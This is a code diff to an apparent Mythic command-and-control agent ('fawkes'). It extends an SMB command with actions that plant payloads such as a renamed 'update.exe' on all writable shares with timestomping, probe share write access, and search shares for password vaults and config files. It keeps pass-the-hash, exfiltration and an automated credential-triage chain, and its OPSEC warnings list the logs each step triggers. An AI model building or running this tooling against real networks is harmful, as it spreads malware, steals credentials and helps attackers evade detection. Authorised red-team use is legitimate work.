@@ -17,11 +17,11 @@ func init() {
 			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "smb_new.js"),
 			Author:     "@galoryber",
 		},
-		Description:         "SMB file operations on remote shares. List shares, browse, read/write/delete files, create directories, rename/move via SMB2 with NTLM auth. Pass-the-hash support.",
-		HelpString:          "smb -action shares -host 192.168.1.1 -username user -password pass -domain DOMAIN\nsmb -action ls -host 192.168.1.1 -share C$ -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -domain DOMAIN\nsmb -action mkdir -host 192.168.1.1 -share C$ -path Users/Public/staging -username admin -password pass\nsmb -action mv -host 192.168.1.1 -share C$ -path old.txt -destination new.txt -username admin -password pass",
-		Version:             2,
+		Description:         "SMB file operations on remote shares. List shares, browse, read/write/delete files, create directories, rename/move, taint shares with planted files, via SMB2 with NTLM auth. Pass-the-hash support.",
+		HelpString:          "smb -action shares -host 192.168.1.1 -username user -password pass -domain DOMAIN\nsmb -action ls -host 192.168.1.1 -share C$ -username admin -hash aad3b435b51404ee:8846f7eaee8fb117 -domain DOMAIN\nsmb -action taint -host 192.168.1.1 -source /tmp/payload.exe -plant_name update.exe -username admin -password pass\nsmb -action mv -host 192.168.1.1 -share C$ -path old.txt -destination new.txt -username admin -password pass",
+		Version:             3,
 		Author:              "@galoryber",
-		MitreAttackMappings: []string{"T1021.002", "T1550.002", "T1570"},
+		MitreAttackMappings: []string{"T1021.002", "T1550.002", "T1570", "T1080", "T1135", "T1039"},
 		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
 			"shareSweepSharesDone":    shareSweepSharesDone,
 			"shareSweepShareHuntDone": shareSweepShareHuntDone,
@@ -39,9 +39,9 @@ func init() {
 				Name:             "action",
 				CLIName:          "action",
 				ModalDisplayName: "Action",
-				Description:      "Operation: shares, ls, cat, upload, rm, mkdir, mv, push (lateral tool transfer), exfil (data exfiltration to SMB share), share-sweep (automated chain)",
+				Description:      "Operation: shares, ls, cat, upload, rm, mkdir, mv, push (lateral tool transfer), exfil (data exfiltration), taint (plant files), share-perms (test read/write access), share-spider (recursive listing), share-search (find sensitive files), share-sweep (automated chain)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"shares", "ls", "cat", "upload", "rm", "mkdir", "mv", "push", "exfil", "share-sweep"},
+				Choices:          []string{"shares", "ls", "cat", "upload", "rm", "mkdir", "mv", "push", "exfil", "taint", "share-perms", "share-spider", "share-search", "share-sweep"},
 				DefaultValue:     "shares",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default"},
@@ -161,12 +161,67 @@ func init() {
 				},
 			},
 			{
+				Name:             "plant_name",
+				CLIName:          "plant_name",
+				ModalDisplayName: "Plant Filename",
+				Description:      "Filename to plant on shares (for taint action, e.g., 'update.exe', 'notes.lnk'). If empty, uses source filename.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
 				Name:             "port",
 				CLIName:          "port",
 				ModalDisplayName: "SMB Port",
 				Description:      "SMB port (default: 445)",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
 				DefaultValue:     445,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "depth",
+				CLIName:          "depth",
+				ModalDisplayName: "Recursion Depth",
+				Description:      "Max directory recursion depth for share-spider and share-search (default: 3)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				DefaultValue:     3,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "extensions",
+				CLIName:          "extensions",
+				ModalDisplayName: "Extension Filter",
+				Description:      "Comma-separated file extension filter for share-spider (e.g., .docx,.xlsx,.pdf)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "patterns",
+				CLIName:          "patterns",
+				ModalDisplayName: "Search Patterns",
+				Description:      "Comma-separated filename patterns for share-search (e.g., *.kdbx,passwords.*,web.config). Defaults to built-in sensitive file patterns.",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "max_results",
+				CLIName:          "max_results",
+				ModalDisplayName: "Max Results",
+				Description:      "Maximum number of results to return for share-spider (default: 500) and share-search (default: 200)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				DefaultValue:     0,
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: false, GroupName: "Default"},
 				},
@@ -188,6 +243,25 @@ func init() {
 			msg := fmt.Sprintf("OPSEC WARNING: SMB %s operation on %s.", action, host)
 			if action == "share-sweep" {
 				msg = fmt.Sprintf("OPSEC WARNING: Share Sweep Chain against %s. This executes 3 automated steps: (1) SMB share enumeration, (2) share-hunt file crawl across all readable shares, (3) local credential triage. Combined footprint generates multiple SMB sessions, share access events (5140/5145), and file access logs. Behavioral analytics may flag the automated access pattern.", host)
+			} else if action == "share-perms" {
+				msg = fmt.Sprintf("OPSEC WARNING: SMB share permission enumeration on %s. "+
+					"Tests read/write access on ALL shares — mounts each share, reads root directory, "+
+					"and creates+deletes a temp file to test write access. Generates multiple share access events (5140/5145) "+
+					"and file creation/deletion events. Failed access attempts generate access denied events.", host)
+			} else if action == "share-spider" {
+				msg = fmt.Sprintf("OPSEC WARNING: SMB share spider on %s\\%s. "+
+					"Recursive directory enumeration generates many file access events (5145). "+
+					"Behavioral analytics may flag rapid directory traversal. "+
+					"Volume of SMB queries is proportional to share depth/size.", host, share)
+			} else if action == "share-search" {
+				searchScope := "all shares"
+				if share != "" {
+					searchScope = share
+				}
+				msg = fmt.Sprintf("OPSEC WARNING: SMB sensitive file search on %s (%s). "+
+					"Recursive search generates many directory access events (5145). "+
+					"Pattern matching against filenames leaves a discoverable access pattern. "+
+					"Matches may include files monitored by DLP solutions.", host, searchScope)
 			} else {
 				if share == "ADMIN$" || share == "C$" || share == "IPC$" {
 					msg += fmt.Sprintf(" Accessing %s share — administrative share access is a high-fidelity lateral movement indicator.", share)
@@ -195,6 +269,16 @@ func init() {
 				if action == "push" {
 					source, _ := taskData.Args.GetStringArg("source")
 					msg += fmt.Sprintf(" Pushing local file '%s' to remote share — file write to remote system is a lateral tool transfer indicator (T1570).", source)
+				}
+				if action == "taint" {
+					plantName, _ := taskData.Args.GetStringArg("plant_name")
+					msg = fmt.Sprintf("OPSEC WARNING: SMB Taint Shared Content on %s. "+
+						"This will enumerate writable shares and plant file '%s' on each. "+
+						"File creation on remote shares generates: SMB write events (Event ID 5145), "+
+						"file creation audit logs, and object access events. "+
+						"DLP/EDR may detect new executables on network shares. "+
+						"Planted files persist until manually removed. "+
+						"MITRE ATT&CK: T1080 (Taint Shared Content), T1570 (Lateral Tool Transfer).", host, plantName)
 				}
 				if action == "exfil" {
 					source, _ := taskData.Args.GetStringArg("source")
@@ -235,6 +319,56 @@ func init() {
 					fmt.Sprintf("SMB exfil: %s (%d bytes) → \\\\%s\\%s\\%s",
 						exfilResult.FileName, exfilResult.TotalSize,
 						exfilResult.Host, exfilResult.Share, exfilResult.RemotePath))
+			}
+			// Track SMB taint operations
+			var taintResult struct {
+				Action  string `json:"action"`
+				Host    string `json:"host"`
+				Planted []struct {
+					Share    string `json:"share"`
+					Path     string `json:"path"`
+					Size     int    `json:"size"`
+					Stomped  bool   `json:"timestomped"`
+				} `json:"planted"`
+			}
+			if err := json.Unmarshal([]byte(responseText), &taintResult); err == nil && taintResult.Action == "taint" && len(taintResult.Planted) > 0 {
+				for _, p := range taintResult.Planted {
+					createArtifact(processResponse.TaskData.Task.ID, "File Write",
+						fmt.Sprintf("SMB taint: planted %s on \\\\%s\\%s (%d bytes, timestomped=%v)",
+							p.Path, taintResult.Host, p.Share, p.Size, p.Stomped))
+				}
+			}
+			// Track share-perms results (writable shares)
+			var permResults []struct {
+				Share string `json:"share"`
+				Read  bool   `json:"read"`
+				Write bool   `json:"write"`
+			}
+			if json.Unmarshal([]byte(responseText), &permResults) == nil && len(permResults) > 0 {
+				for _, p := range permResults {
+					if p.Write {
+						createArtifact(processResponse.TaskData.Task.ID, "Network Share",
+							fmt.Sprintf("[WRITABLE] \\\\%s (read+write access)", p.Share))
+					}
+				}
+			}
+			// Track share-search results (sensitive files found)
+			var searchResult struct {
+				Host    string `json:"host"`
+				Count   int    `json:"count"`
+				Matches []struct {
+					Share   string `json:"share"`
+					Path    string `json:"path"`
+					Pattern string `json:"pattern"`
+				} `json:"matches"`
+			}
+			if json.Unmarshal([]byte(responseText), &searchResult) == nil && searchResult.Count > 0 {
+				for _, m := range searchResult.Matches {
+					createArtifact(processResponse.TaskData.Task.ID, "Sensitive File",
+						fmt.Sprintf("[MATCH] \\\\%s\\%s\\%s (pattern: %s)", searchResult.Host, m.Share, m.Path, m.Pattern))
+				}
+				logOperationEvent(processResponse.TaskData.Task.ID,
+					fmt.Sprintf("[DISCOVERY] Found %d sensitive files on %s via share-search", searchResult.Count, searchResult.Host), false)
 			}
 			// Track SMB operations: look for host reference in output
 			if strings.Contains(responseText, "Shares on") || strings.Contains(responseText, "SMB") {
@@ -351,6 +485,30 @@ func init() {
 				source, _ := taskData.Args.GetStringArg("source")
 				displayMsg = fmt.Sprintf("SMB push %s → \\\\%s\\%s\\%s", source, host, share, path)
 			}
+			if action == "taint" {
+				plantName, _ := taskData.Args.GetStringArg("plant_name")
+				source, _ := taskData.Args.GetStringArg("source")
+				if plantName == "" {
+					plantName = filepath.Base(source)
+				}
+				displayMsg = fmt.Sprintf("SMB taint \\\\%s — plant '%s' on writable shares", host, plantName)
+			}
+			if action == "share-perms" {
+				displayMsg = fmt.Sprintf("SMB share-perms \\\\%s — test read/write access on all shares", host)
+			}
+			if action == "share-spider" {
+				displayMsg = fmt.Sprintf("SMB share-spider \\\\%s\\%s", host, share)
+				if path != "" {
+					displayMsg += fmt.Sprintf("\\%s", path)
+				}
+			}
+			if action == "share-search" {
+				searchScope := "all shares"
+				if share != "" {
+					searchScope = share
+				}
+				displayMsg = fmt.Sprintf("SMB share-search \\\\%s (%s)", host, searchScope)
+			}
 			response.DisplayParams = &displayMsg
 
 			artifactMsg := fmt.Sprintf("SMB2 %s to %s", action, host)
@@ -370,173 +528,15 @@ func init() {
 					fmt.Sprintf("SMB file push to %s", host))
 			}
 
+			if action == "taint" {
+				plantName, _ := taskData.Args.GetStringArg("plant_name")
+				logOperationEvent(taskData.Task.ID,
+					fmt.Sprintf("[TAINT SHARED CONTENT] Planting '%s' on writable shares at \\\\%s (T1080)", plantName, host), false)
+				tagTask(taskData.Task.ID, "LATERAL",
+					fmt.Sprintf("SMB taint shared content on %s", host))
+			}
+
 			return response
 		},
 	})
-}
-
-// shareSweepSharesDone handles share enumeration completion, creates share-hunt subtask.
-func shareSweepSharesDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
-	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
-		TaskID:  taskData.Task.ID,
-		Success: true,
-	}
-
-	responseText := getSubtaskResponses(subtaskData.Task.ID)
-	shareCount := 0
-	if responseText != "" {
-		for _, line := range strings.Split(responseText, "\n") {
-			line = strings.TrimSpace(line)
-			if line != "" && !strings.HasPrefix(line, "Shares on") && !strings.HasPrefix(line, "-") &&
-				!strings.HasPrefix(line, "Name") && !strings.HasPrefix(line, "Found") {
-				shareCount++
-			}
-		}
-	}
-
-	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-		TaskID:   taskData.Task.ID,
-		Response: []byte(fmt.Sprintf("[Step 1/3] Share enumeration complete. %d shares found.", shareCount)),
-	})
-
-	if shareCount == 0 {
-		completed := true
-		response.Completed = &completed
-		msg := "Share Sweep: no shares found — chain complete"
-		response.Stdout = &msg
-		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-			TaskID: taskData.Task.ID, Response: []byte(msg),
-		})
-		return response
-	}
-
-	// Get chain context for credentials
-	chainCtx := extractChainContext(taskData.Task.Stdout)
-	host := chainCtx["host"]
-	username := chainCtx["username"]
-	password := chainCtx["password"]
-	hash := chainCtx["hash"]
-
-	// Step 2: Run share-hunt to crawl shares for interesting files
-	params := map[string]interface{}{
-		"hosts":    host,
-		"username": username,
-		"filter":   "all",
-	}
-	if password != "" {
-		params["password"] = password
-	}
-	if hash != "" {
-		params["hash"] = hash
-	}
-	domain := chainCtx["domain"]
-	if domain != "" {
-		params["domain"] = domain
-	}
-	paramsJSON, _ := json.Marshal(params)
-
-	callbackFunc := "shareSweepShareHuntDone"
-	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
-		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
-			TaskID:                  taskData.Task.ID,
-			SubtaskCallbackFunction: &callbackFunc,
-			CommandName:             "share-hunt",
-			Params:                  string(paramsJSON),
-		},
-	)
-	if err != nil {
-		completed := true
-		response.Completed = &completed
-		msg := fmt.Sprintf("Share Sweep: shares found but failed to start share-hunt: %s", err.Error())
-		response.Stderr = &msg
-		return response
-	}
-
-	return response
-}
-
-// shareSweepShareHuntDone handles share-hunt completion, creates local triage subtask.
-func shareSweepShareHuntDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
-	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
-		TaskID:  taskData.Task.ID,
-		Success: true,
-	}
-
-	responseText := getSubtaskResponses(subtaskData.Task.ID)
-	fileCount := 0
-	if responseText != "" {
-		fileCount = strings.Count(responseText, "\n")
-	}
-
-	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-		TaskID:   taskData.Task.ID,
-		Response: []byte(fmt.Sprintf("[Step 2/3] Share hunt complete. ~%d interesting files found on remote shares.", fileCount)),
-	})
-
-	// Step 3: Run local triage for credential/config files
-	callbackFunc := "shareSweepTriageDone"
-	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
-		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
-			TaskID:                  taskData.Task.ID,
-			SubtaskCallbackFunction: &callbackFunc,
-			CommandName:             "triage",
-			Params:                  `{"action":"credentials"}`,
-		},
-	)
-	if err != nil {
-		completed := true
-		response.Completed = &completed
-		msg := fmt.Sprintf("Share Sweep: share hunt done but failed to start triage: %s", err.Error())
-		response.Stderr = &msg
-		return response
-	}
-
-	return response
-}
-
-// shareSweepTriageDone handles triage completion, aggregates all chain results.
-func shareSweepTriageDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
-	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
-		TaskID:  taskData.Task.ID,
-		Success: true,
-	}
-
-	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-		TaskID:   taskData.Task.ID,
-		Response: []byte("[Step 3/3] Local triage complete."),
-	})
-
-	// Aggregate all subtask results
-	parentID := taskData.Task.ID
-	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
-		TaskID:             parentID,
-		SearchParentTaskID: &parentID,
-	})
-
-	summary := "=== Share Sweep Chain Complete ===\n"
-	if err == nil && searchResult.Success {
-		successCount := 0
-		errorCount := 0
-		for _, task := range searchResult.Tasks {
-			if task.Status == "error" {
-				errorCount++
-			} else if task.Completed {
-				successCount++
-			}
-			summary += fmt.Sprintf("[%s] %s %s\n", task.Status, task.CommandName, task.DisplayParams)
-		}
-		summary += fmt.Sprintf("\nTotal: %d subtasks (%d success, %d errors)\n", len(searchResult.Tasks), successCount, errorCount)
-	} else {
-		summary += "Could not retrieve subtask details.\n"
-	}
-
-	completed := true
-	response.Completed = &completed
-	response.Stdout = &summary
-
-	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
-		TaskID: taskData.Task.ID, Response: []byte(summary),
-	})
-
-	return response
 }
